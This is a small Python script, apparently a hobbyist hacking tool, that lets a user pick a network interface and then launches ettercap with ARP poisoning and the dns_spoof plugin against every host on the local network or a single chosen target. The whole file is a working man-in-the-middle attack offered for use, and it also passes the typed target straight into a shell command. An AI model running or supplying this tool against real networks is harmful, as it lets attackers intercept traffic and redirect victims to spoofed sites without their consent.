#coded by 0xbit
import psutil
from tabulate import tabulate
import os

def banner():
    os.system('clear')
    print()
    print('''
    
     ____  _____ ____  ____  _____ ____   ____  _   _ ____    ____  ____   ___   ___  _____ 
    |  _ \| ____|  _ \/ ___|| ____/ ___| |  _ \| \ | / ___|  / ___||  _ \ / _ \ / _ \|  ___|
    | | | |  _| | | | \___ \|  _|| |     | | | |  \| \___ \  \___ \| |_) | | | | | | | |_   
    | |_| | |___| |_| |___) | |__| |___  | |_| | |\  |___) |  ___) |  __/| |_| | |_| |  _|  
    |____/|_____|____/|____/|_____\____| |____/|_| \_|____/  |____/|_|    \___/ \___/|_|    
                          DNS SPOOFING USING ETTERCAP BY 0XBIT                                                                   
    
    ''')

addrs = psutil.net_if_addrs()
inter = list(addrs.keys())

inter_dict = {}
for i, interface in enumerate(inter, start=1):
    inter_dict[i] = interface

def menu():
    format = []
    header = ['WIFI ADAPTER NAME']
    format.append(header)
    d = 0
    for element in inter:
        d += 1
        wifi_name = str(element)
        format.append([f'{d}. ' + wifi_name])
    print(tabulate(format, tablefmt='fancy_grid'))
    
    try:
        select = int(input('select: '))
        if select == select:
            iface = inter_dict[select]
        else:
            pass
    except KeyError:
        os.system('clear')
        menu()

    print(tabulate([['SELECT SPOOF RANGE', '1. ALL HOST IN THE NETWORK', '2. SPECIFIC TARGET']], tablefmt='fancy_grid'))
    selectt = int(input('select: '))
    if selectt == 1:
        os.system(f'ettercap -T -S -i {iface} -P dns_spoof -M arp ////')
    elif selectt == 2:    
        target = input('target: ')
        try:
            os.system(f'ettercap -T -S -i {iface} -P dns_spoof -M arp /{target}//')
        except KeyboardInterrupt:
            banner()
            menu()
banner()
menu() 
